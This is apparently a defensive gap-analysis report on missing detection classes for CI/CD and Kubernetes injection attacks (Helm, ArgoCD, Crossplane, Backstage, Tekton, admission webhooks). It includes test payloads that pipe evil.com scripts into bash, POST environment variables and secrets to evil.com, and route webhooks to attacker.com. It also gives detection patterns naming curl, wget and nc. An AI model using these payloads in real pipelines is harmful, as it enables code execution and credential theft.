# SCAN AREA 8: Infrastructure Attack Gaps Analysis

**File Analyzed:** `packages/engine/src/classes/injection/infra-attacks.ts`  
**Analysis Date:** 2026-03-09  
**Scope:** Analysis only — no code changes

---

## Summary

The `infra-attacks.ts` module contains 5 InvariantClassModule definitions:
1. `githubActionsInjection` - GitHub Actions workflow command injection
2. `kubernetesRbacAbuse` - Kubernetes RBAC abuse patterns
3. `terraformInjection` - Terraform HCL injection
4. `dockerEscapeIndicator` - Container escape indicators
5. `cloudMetadataAdvanced` - Cloud metadata service probing

**Gap Coverage:** 6 major infrastructure attack patterns are **NOT** covered.

---

## GAP 1: Kubernetes Admission Webhook Bypass

| Attribute | Details |
|-----------|---------|
| **Class File** | `infra-attacks.ts` (missing) |
| **Missing Pattern** | Kubernetes Mutating/Validating Admission Webhook manipulation to bypass security policies |
| **Test Payload** | `{"apiVersion":"admissionregistration.k8s.io/v1","kind":"MutatingWebhookConfiguration","metadata":{"name":"bypass-webhook"},"webhooks":[{"name":"bypass.example.com","rules":[{"apiGroups":["*"],"apiVersions":["*"],"operations":["CREATE"],"resources":["pods"]}],"clientConfig":{"url":"https://attacker.com/webhook"}}]}` |
| **Benign Counterexample** | Legitimate OPA Gatekeeper webhook: `{"apiVersion":"admissionregistration.k8s.io/v1","kind":"ValidatingWebhookConfiguration","webhooks":[{"name":"validation.gatekeeper.sh","clientConfig":{"service":{"name":"gatekeeper-webhook-service","namespace":"gatekeeper-system"}}}]}` |
| **Severity** | **CRITICAL** |
| **FP Risk** | Medium - Requires context to distinguish legitimate policy engines (OPA, Kyverno) from malicious webhooks |
| **MITRE** | T1556.002 |
| **CWE** | CWE-284 |

**Why Missing:** Current `kubernetesRbacAbuse` focuses on RBAC API abuse but doesn't cover admission control manipulation. Webhook bypass is a separate attack surface.

**Detection Challenges:**
- Legitimate webhooks (OPA Gatekeeper, Kyverno, Istio) vs malicious external URLs
- Requires allowlisting known webhook service namespaces
- URL patterns (`https://attacker.com` vs `https://gatekeeper-webhook.gatekeeper-system.svc`)

---

## GAP 2: Helm Chart Injection

| Attribute | Details |
|-----------|---------|
| **Class File** | `infra-attacks.ts` (missing) |
| **Missing Pattern** | Malicious Helm chart templates with embedded shell execution, chart dependency confusion, or post-render hooks |
| **Test Payload** | Template containing: `command: ["/bin/sh"]` + `args: ["-c", "curl https://evil.com/shell.sh | bash && {{ .command }}"]` |
| **Benign Counterexample** | Standard ConfigMap template: `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: {{ include "chart.fullname" . }}\ndata:\n  config.yaml: |\n    app: {{ .Values.appName | quote }}` |
| **Severity** | **HIGH** |
| **FP Risk** | High - Helm templates legitimately use Go template syntax; distinguishing malicious from benign requires context |
| **MITRE** | T1195.001 |
| **CWE** | CWE-94 |

**Why Missing:** No Helm-specific detection exists. While `terraformInjection` covers HCL, Helm's Go template syntax and chart packaging have unique injection patterns.

**Detection Indicators:**
- `{{ ... }}` template blocks containing shell commands (`bash`, `sh`, `curl`, `wget`)
- `{{ include ... }}` with user-controlled values piped to `safeHTML` or `safeJS`
- Post-render hooks in `helm install --post-renderer`
- Chart dependency confusion (`dependencies[].repository` pointing to untrusted sources)

---

## GAP 3: ArgoCD Manifest Injection

| Attribute | Details |
|-----------|---------|
| **Class File** | `infra-attacks.ts` (missing) |
| **Missing Pattern** | Malicious ArgoCD Application/Project manifests with sync waves, resource hooks, or custom plugins |
| **Test Payload** | `apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: malicious-app\n  annotations:\n    argocd.argoproj.io/sync-wave: "-1"\nspec:\n  source:\n    plugin:\n      name: custom-plugin\n      env:\n        - name: SCRIPT\n          value: "curl https://evil.com/exfil | sh"` |
| **Benign Counterexample** | Standard ArgoCD Application: `apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: guestbook\nspec:\n  project: default\n  source:\n    repoURL: https://github.com/argoproj/argocd-example-apps.git\n    targetRevision: HEAD\n    path: guestbook` |
| **Severity** | **HIGH** |
| **FP Risk** | Medium - ArgoCD plugins and hooks are legitimate features; detecting abuse requires whitelist patterns |
| **MITRE** | T1190, T1059.004 |
| **CWE** | CWE-78 |

**Why Missing:** GitOps-specific attack patterns not covered. ArgoCD has unique CRDs (Application, AppProject, ApplicationSet) with injection points.

**Detection Indicators:**
- `argocd.argoproj.io/hook: PreSync/PostSync` with destructive commands
- Custom plugins with environment variables containing shell metacharacters
- `repoURL` pointing to untrusted/external domains
- `sync-wave: "-5"` (pre-sync hooks) with elevated privileges

---

## GAP 4: Crossplane XR (Composite Resource) Injection

| Attribute | Details |
|-----------|---------|
| **Class File** | `infra-attacks.ts` (missing) |
| **Missing Pattern** | Malicious Crossplane Composition/XR with credential injection, patch/transform abuse, or provider abuse |
| **Test Payload** | `apiVersion: apiextensions.crossplane.io/v1\nkind: Composition\nspec:\n  resources:\n    - name: s3-bucket\n      patches:\n        - fromFieldPath: "spec.parameters.credentials"\n          toFieldPath: "spec.forProvider.credentialsSecretRef"\n          transforms:\n            - type: string\n              string:\n                fmt: "curl https://evil.com/%s"` |
| **Benign Counterexample** | Standard Composition: `apiVersion: apiextensions.crossplane.io/v1\nkind: Composition\nspec:\n  resources:\n    - name: s3-bucket\n      base:\n        apiVersion: s3.aws.upbound.io/v1beta1\n        kind: Bucket` |
| **Severity** | **HIGH** |
| **FP Risk** | Medium - Crossplane Compositions legitimately use patches/transforms; detecting abuse requires analyzing transform patterns |
| **MITRE** | T1552.001, T1098 |
| **CWE** | CWE-522 |

**Why Missing:** Cloud-native control plane (Crossplane) patterns not covered. XR/Composition have unique injection vectors through patch/transform chains.

**Detection Indicators:**
- `transforms[].string.fmt` with shell commands or URL exfiltration
- `connectionSecretKeys` mapping to unexpected credential fields
- `patchSet` references with privilege escalation patterns
- Malicious `providerConfigRef` pointing to compromised provider configurations

---

## GAP 5: Backstage Plugin Injection

| Attribute | Details |
|-----------|---------|
| **Class File** | `infra-attacks.ts` (missing) |
| **Missing Pattern** | Malicious Backstage software templates with scaffolder action abuse, custom action injection, or catalog entity poisoning |
| **Test Payload** | `apiVersion: scaffolder.backstage.io/v1beta3\nkind: Template\nspec:\n  steps:\n    - id: execute\n      action: debug:log\n      input:\n        message: |
          ${{ parameters.userInput | dump }}\n          ${{ execute('curl https://evil.com/' + parameters.secret) }}\n    - id: publish\n      action: publish:github\n      input:\n        secrets:\n          MY_TOKEN: ${{ parameters.stolenToken }}` |
| **Benign Counterexample** | Standard Backstage Template: `apiVersion: scaffolder.backstage.io/v1beta3\nkind: Template\nspec:\n  steps:\n    - id: fetch\n      name: Fetch Template\n      action: fetch:template\n      input:\n        url: ./skeleton\n        values:\n          name: ${{ parameters.name }}` |
| **Severity** | **HIGH** |
| **FP Risk** | High - Backstage templates use nunjucks templating; legitimate actions vs malicious actions requires allowlisting |
| **MITRE** | T1059.004, T1195.001 |
| **CWE** | CWE-94 |

**Why Missing:** Developer portal (Backstage) attack patterns not covered. Software Templates have unique injection through scaffolder actions and template variables.

**Detection Indicators:**
- Custom scaffolder actions (`action: custom:*` or unknown action IDs)
- `fetch:*` actions with untrusted/external URLs
- Template expressions `${{ ... }}` containing shell commands or exfiltration
- `publish:*` actions with hardcoded secrets or credential leakage
- `catalog-info.yaml` entities with poisoned metadata annotations

---

## GAP 6: Tekton Pipeline Injection

| Attribute | Details |
|-----------|---------|
| **Class File** | `infra-attacks.ts` (missing) |
| **Missing Pattern** | Malicious Tekton Task/Pipeline with step injection, workspace poisoning, or sidecar abuse |
| **Test Payload** | `apiVersion: tekton.dev/v1beta1\nkind: Task\nmetadata:\n  name: malicious-task\nspec:\n  steps:\n    - name: build\n      image: node:14\n      script: |\n        #!/bin/sh\n        curl https://evil.com/steal.sh | bash\n        npm install\n    - name: exfil\n      image: alpine/curl\n      script: |\n        curl -X POST https://evil.com/exfil -d "$(env)"\n  sidecars:\n    - name: proxy\n      image: evil/interceptor:latest` |
| **Benign Counterexample** | Standard Tekton Task: `apiVersion: tekton.dev/v1beta1\nkind: Task\nmetadata:\n  name: unit-tests\nspec:\n  steps:\n    - name: run-tests\n      image: node:14\n      script: |\n        npm ci\n        npm test` |
| **Severity** | **CRITICAL** |
| **FP Risk** | Medium - Tekton Tasks legitimately use shell scripts; detecting abuse requires pattern analysis for exfiltration commands |
| **MITRE** | T1059.004, T1552.001 |
| **CWE** | CWE-78 |

**Why Missing:** Kubernetes-native CI/CD (Tekton) attack patterns not covered. Tasks have unique injection through multi-step scripts and sidecar containers.

**Detection Indicators:**
- `script:` blocks containing `curl`, `wget`, `nc` with external URLs
- `env:` with `valueFrom.secretKeyRef` followed by network egress
- `sidecars:` with untrusted images or network listeners
- `params:` with default values containing shell metacharacters
- Workspace mounts with sensitive paths (`/etc/kubernetes`, `/var/run/secrets`)

---

## Cross-Cutting Concerns

### 1. Pattern Overlap with Existing Classes

| Gap | Related Existing Class | Differentiation |
|-----|------------------------|-----------------|
| Helm Chart Injection | `terraformInjection` | Go templates vs HCL; Helm has chart lifecycle hooks |
| ArgoCD Manifest Injection | `kubernetesRbacAbuse` | ArgoCD CRDs vs raw K8s API abuse |
| Tekton Pipeline Injection | `githubActionsInjection` | Both CI/CD but different syntax (YAML vs workflow DSL) |
| Backstage Plugin Injection | `githubActionsInjection` | Template syntax differs (nunjucks vs GitHub expressions) |

### 2. Shared Detection Primitives Needed

All 6 gaps would benefit from shared detection primitives:

1. **Shell Command Detection:** `curl`, `wget`, `nc`, `bash -c`, `sh -c` in configuration contexts
2. **External URL Detection:** `https?://` patterns not matching allowlisted domains
3. **Template Expression Parsing:** Go templates (`{{ }}`), nunjucks (`${{ }}`), HCL interpolation
4. **Secret Reference Tracking:** Detecting exfiltration after secret mounting

### 3. Severity Distribution

```
CRITICAL: 2 (K8s Admission Webhook Bypass, Tekton Pipeline Injection)
HIGH:     4 (Helm Chart, ArgoCD, Crossplane, Backstage)
```

### 4. False Positive Risk Distribution

```
High FP Risk:   2 (Helm Chart, Backstage) - Heavy template usage
Medium FP Risk: 4 (Others) - Require context-aware detection
```

---

## Recommendations

### Immediate (High Priority)

1. **Add `kubernetesAdmissionWebhookAbuse` class**
   - Focus on webhook configurations with external URLs
   - Allowlist known policy engines (OPA, Kyverno, Istio, Calico)

2. **Add `tektonTaskInjection` class**
   - Focus on script blocks with exfiltration patterns
   - Leverage existing shell command detection primitives

### Short-term (Medium Priority)

3. **Add `argocdApplicationInjection` class**
   - Focus on PreSync/PostSync hooks and custom plugins
   - Require repoURL allowlisting for detection

4. **Add `crossplaneCompositionAbuse` class**
   - Focus on transform chains with credential leakage
   - Detect malicious providerConfigRef patterns

### Long-term (Lower Priority)

5. **Add `helmTemplateInjection` class**
   - Requires careful tuning due to high FP risk
   - Focus on post-render hooks and dependency confusion

6. **Add `backstageTemplateInjection` class**
   - Requires scaffolder action allowlisting
   - Focus on custom actions and secret exfiltration

---

## Appendix: Regex Pattern Suggestions

### K8s Admission Webhook Bypass
```regex
/apiVersion["']?\s*:\s*["']?admissionregistration\.k8s\.io/v1["']?[\s\S]{0,500}clientConfig["']?\s*:\s*\{[^}]*url["']?\s*:\s*["']https?://(?!(?:127\.0\.0\.1|localhost|\[::1\])\b)(?!.*\.svc\.)(?!.*\.cluster\.local)
```

### Tekton Pipeline Injection
```regex
(?:tekton\.dev/v1beta1|tekton\.dev/v1)[\s\S]{0,200}script\s*:\s*\|[\s\S]{0,200}\b(?:curl|wget)\s+.*https?://
```

### ArgoCD Manifest Injection
```regex
argoproj\.io/v1alpha1[\s\S]{0,300}argocd\.argoproj\.io/(?:hook|sync-wave)["']?\s*:\s*["']?(?:PreSync|PostSync|SyncFail|-?\d+)
```

### Crossplane XR Injection
```regex
type\s*:\s*string\s*string\s*:\s*\{[^}]*fmt\s*:\s*["'][^"']*(?:curl|wget|http|https://)
```

---

*End of Report*
